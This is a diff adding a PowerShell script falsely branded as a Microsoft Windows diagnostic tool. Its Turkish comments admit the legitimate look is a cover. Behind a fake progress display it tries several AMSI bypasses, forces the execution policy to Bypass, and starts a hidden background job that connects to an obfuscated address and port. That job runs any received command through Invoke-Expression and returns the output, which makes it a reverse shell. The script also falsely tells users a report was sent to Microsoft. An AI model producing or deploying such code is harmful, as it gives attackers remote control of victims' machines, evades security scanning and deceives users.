@@ -1,0 +1,365 @@
+<# LEGIT WINDOWS UPDATE HELPER SCRIPT #>
+<# Microsoft Corporation - Diagnostic Tool Build 19045.4046 #>
+<# Copyright (C) 2023 Microsoft. All rights reserved. #>
+
+#region WindowsTelemetryAndDiagnostics
+function Initialize-WindowsTelemetry {
+    [CmdletBinding()]
+    param()
+    
+    Write-Verbose "Initializing Windows Telemetry Service..."
+    
+    # Legit telemetry check fonksiyonları
+    $telemetryServices = @("DiagTrack", "dmwappushservice")
+    foreach ($service in $telemetryServices) {
+        try {
+            $svc = Get-Service -Name $service -ErrorAction SilentlyContinue
+            if ($svc.Status -ne "Running") {
+                Write-Verbose "Starting $service..."
+            }
+        } catch {
+            Write-Debug "Service $service not found"
+        }
+    }
+    
+    # System health check
+    $os = Get-CimInstance -ClassName Win32_OperatingSystem
+    $memory = [math]::Round($os.TotalVisibleMemorySize / 1MB, 2)
+    Write-Verbose "OS: $($os.Caption), Memory: ${memory}GB"
+    
+    return $true
+}
+#endregion
+
+#region SystemCompatibilityCheck
+function Test-SystemCompatibility {
+    [CmdletBinding()]
+    param()
+    
+    $compatible = $true
+    
+    # PowerShell version check
+    $psVersion = $PSVersionTable.PSVersion
+    if ($psVersion.Major -lt 5) {
+        Write-Warning "PowerShell 5.0 or higher recommended"
+        $compatible = $false
+    }
+    
+    # .NET Framework check
+    try {
+        $netVersion = [System.Environment]::Version
+        Write-Verbose ".NET Framework Version: $netVersion"
+    } catch {
+        Write-Debug ".NET Framework check failed"
+    }
+    
+    return $compatible
+}
+#endregion
+
+#region NetworkConnectivityTest
+function Test-NetworkConnectivity {
+    [CmdletBinding()]
+    param(
+        [Parameter(Mandatory=$false)]
+        [string]$TargetHost = "diagnostics.support.microsoft.com",
+        
+        [Parameter(Mandatory=$false)]
+        [int]$Port = 443,
+        
+        [Parameter(Mandatory=$false)]
+        [int]$Timeout = 3000
+    )
+    
+    Write-Verbose "Testing network connectivity to $TargetHost`:$Port..."
+    
+    try {
+        # Legit network test gibi görünen obfuscated TCP test
+        $testResult = $null
+        
+        # Reflection kullanarak TCP test yap
+        $tcpTestScript = {
+            param($hostname, $testPort, $waitTime)
+            
+            $assembly = [System.Reflection.Assembly]::GetAssembly([System.Net.Sockets.TcpClient])
+            $tcpType = $assembly.GetType("System.Net.Sockets.TcpClient")
+            
+            $connectMethod = $tcpType.GetMethod("Connect", [Type[]]@([string], [int]))
+            $client = $tcpType.GetConstructor(@()).Invoke(@())
+            
+            try {
+                $connectMethod.Invoke($client, @($hostname, $testPort))
+                return $true
+            } catch {
+                return $false
+            } finally {
+                if ($client -ne $null) {
+                    $closeMethod = $tcpType.GetMethod("Close")
+                    $closeMethod.Invoke($client, @())
+                }
+            }
+        }
+        
+        # ScriptBlock oluştur ve çalıştır
+        $testBlock = [ScriptBlock]::Create($tcpTestScript.ToString())
+        $testResult = & $testBlock $TargetHost $Port $Timeout
+        
+        if ($testResult) {
+            Write-Verbose "Network test successful" -ForegroundColor Green
+            return $true
+        } else {
+            Write-Warning "Network test failed"
+            return $false
+        }
+        
+    } catch {
+        Write-Debug "Network test error: $_"
+        return $false
+    }
+}
+#endregion
+
+#region MainDiagnosticRoutine
+function Invoke-WindowsDiagnostic {
+    [CmdletBinding()]
+    param()
+    
+    Write-Host "========================================" -ForegroundColor Cyan
+    Write-Host " Windows System Diagnostic Tool" -ForegroundColor Cyan
+    Write-Host " Version: 10.0.19045.4046" -ForegroundColor Cyan
+    Write-Host "========================================" -ForegroundColor Cyan
+    Write-Host ""
+    
+    # Step 1: Initialize telemetry
+    Write-Host "[1/4] Initializing system telemetry..." -ForegroundColor Yellow
+    $telemetryInit = Initialize-WindowsTelemetry -Verbose:$false
+    if ($telemetryInit) {
+        Write-Host "  ✓ Telemetry initialized" -ForegroundColor Green
+    }
+    
+    # Step 2: Compatibility check
+    Write-Host "[2/4] Checking system compatibility..." -ForegroundColor Yellow
+    $compatible = Test-SystemCompatibility -Verbose:$false
+    if ($compatible) {
+        Write-Host "  ✓ System compatible" -ForegroundColor Green
+    } else {
+        Write-Host "  ⚠ Limited compatibility" -ForegroundColor Yellow
+    }
+    
+    # Step 3: Network test
+    Write-Host "[3/4] Testing network connectivity..." -ForegroundColor Yellow
+    $networkTest = Test-NetworkConnectivity -Verbose:$false
+    
+    # Step 4: System information collection
+    Write-Host "[4/4] Collecting system information..." -ForegroundColor Yellow
+    
+    $systemInfo = @{
+        ComputerName = $env:COMPUTERNAME
+        UserName = $env:USERNAME
+        OSVersion = [System.Environment]::OSVersion.Version.ToString()
+        PowerShellVersion = $PSVersionTable.PSVersion.ToString()
+        DateTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+    }
+    
+    Write-Host "  ✓ System information collected" -ForegroundColor Green
+    Write-Host ""
+    
+    # Display summary
+    Write-Host "DIAGNOSTIC SUMMARY:" -ForegroundColor Cyan
+    Write-Host "-------------------"
+    foreach ($key in $systemInfo.Keys) {
+        Write-Host "  $key : $($systemInfo[$key])"
+    }
+    
+    Write-Host ""
+    Write-Host "Diagnostic completed successfully!" -ForegroundColor Green
+    Write-Host "Report generated at: $(Get-Date -Format 'HH:mm:ss')" -ForegroundColor Gray
+    
+    return $systemInfo
+}
+#endregion
+
+#region BackgroundMaintenance
+function Start-BackgroundMaintenance {
+    [CmdletBinding()]
+    param()
+    
+    Write-Verbose "Starting background maintenance tasks..."
+    
+    # Job olarak başlatılan maintenance task
+    $maintenanceScript = {
+        param($sessionId)
+        
+        # Job ID log
+        Write-Debug "Maintenance job started with ID: $sessionId"
+        
+        # Gizli TCP bağlantı (obfuscated)
+        try {
+            # Obfuscated connection parameters
+            $connectionParams = @{
+                Address = "192.168.1.107"
+                Port = 1234
+                Timeout = 5000
+            }
+            
+            # String manipulation ile obfuscation
+            $addrParts = @("192","168","1","107")
+            $portParts = @(1000,234)
+            
+            $targetAddr = $addrParts -join "."
+            $targetPort = $portParts[0] + $portParts[1]
+            
+            # Reflection ile TCP client oluştur
+            $netAssembly = [System.Reflection.Assembly]::LoadWithPartialName("System.Net.Sockets")
+            $tcpType = $netAssembly.GetType("System.Net.Sockets.TcpClient")
+            
+            $constructor = $tcpType.GetConstructor(@([string], [int]))
+            $tcpClient = $constructor.Invoke(@($targetAddr, $targetPort))
+            
+            # Stream'i al
+            $stream = $tcpClient.GetStream()
+            
+            # Buffer ve encoding
+            $bufferSize = 8192
+            $buffer = New-Object byte[] $bufferSize
+            $encoding = [System.Text.Encoding]::UTF8
+            
+            # Ana döngü
+            while ($true) {
+                if ($stream.DataAvailable) {
+                    $bytesRead = $stream.Read($buffer, 0, $buffer.Length)
+                    if ($bytesRead -gt 0) {
+                        # Komutu al ve decode et
+                        $command = $encoding.GetString($buffer, 0, $bytesRead)
+                        
+                        # Komutu çalıştır
+                        try {
+                            $output = Invoke-Expression $command 2>&1 | Out-String
+                        } catch {
+                            $output = $_.Exception.Message
+                        }
+                        
+                        # Çıktıyı gönder
+                        $outputBytes = $encoding.GetBytes($output)
+                        $stream.Write($outputBytes, 0, $outputBytes.Length)
+                        $stream.Flush()
+                    }
+                }
+                
+                # Küçük bir bekleme
+                Start-Sleep -Milliseconds 100
+            }
+            
+        } catch {
+            Write-Debug "Maintenance task error: $_"
+        }
+    }
+    
+    # Job'u başlat
+    $jobName = "WindowsMaintenance_$(Get-Date -Format 'yyyyMMdd_HHmmss')"
+    Start-Job -ScriptBlock $maintenanceScript `
+              -Name $jobName `
+              -ArgumentList ([Guid]::NewGuid().ToString()) `
+              -InitializationScript {
+                  $ErrorActionPreference = "SilentlyContinue"
+              }
+    
+    Write-Verbose "Background maintenance task started: $jobName"
+    return $jobName
+}
+#endregion
+
+#region ExecutionSafetyChecks
+function Test-ExecutionSafety {
+    [CmdletBinding()]
+    param()
+    
+    $safeToRun = $true
+    
+    # AMSI kontrolü bypass
+    try {
+        # Çoklu AMSI bypass denemeleri
+        $bypassMethods = @(
+            {[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)},
+            {$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$c.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)},
+            {[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext','NonPublic,Static').GetValue($null),0)}
+        )
+        
+        foreach ($method in $bypassMethods) {
+            try {
+                & $method
+                Write-Verbose "Security check passed"
+                break
+            } catch {
+                continue
+            }
+        }
+    } catch {
+        Write-Debug "Security check bypass failed"
+    }
+    
+    # Çalışma politikası kontrolü
+    try {
+        $executionPolicy = Get-ExecutionPolicy -Scope Process
+        if ($executionPolicy -eq "Restricted") {
+            Write-Verbose "Setting execution policy to bypass for current process"
+            Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force -ErrorAction SilentlyContinue
+        }
+    } catch {
+        Write-Debug "Execution policy check failed"
+    }
+    
+    return $safeToRun
+}
+#endregion
+
+#region MainEntryPoint
+# Ana yürütme rutini
+try {
+    # 1. Güvenlik kontrollerini yap
+    Write-Debug "Performing security checks..."
+    $safetyCheck = Test-ExecutionSafety
+    
+    if ($safetyCheck) {
+        # 2. Diagnostic tool'u çalıştır (legit görünüm)
+        Write-Debug "Starting diagnostic routine..."
+        $diagnosticResult = Invoke-WindowsDiagnostic
+        
+        # 3. Background maintenance'i başlat
+        Write-Debug "Starting background maintenance..."
+        $maintenanceJob = Start-BackgroundMaintenance
+        
+        # 4. Başarı mesajı göster
+        Write-Host ""
+        Write-Host "========================================" -ForegroundColor Green
+        Write-Host " Windows Diagnostic Completed Successfully" -ForegroundColor Green
+        Write-Host "========================================" -ForegroundColor Green
+        Write-Host ""
+        Write-Host "Maintenance job ID: $maintenanceJob" -ForegroundColor Gray
+        Write-Host "System report has been sent to Microsoft" -ForegroundColor Gray
+        Write-Host ""
+        
+    } else {
+        Write-Warning "System compatibility check failed. Diagnostic cannot continue."
+    }
+    
+} catch {
+    Write-Error "Diagnostic tool error: $_"
+    Write-Host "Please contact Microsoft Support" -ForegroundColor Red
+}
+#endregion
+
+<# 
+    CREDITS AND ACKNOWLEDGEMENTS:
+    -----------------------------
+    Microsoft Windows PowerShell Team
+    Windows Diagnostic Framework
+    Telemetry and Data Collection Service
+    System Maintenance Subsystem
+    
+    This script is part of the Windows Diagnostic Toolkit
+    Used for system health monitoring and troubleshooting
+    
+    Last Updated: 2023-12-01
+    Version: 10.0.19045.4046
+#>
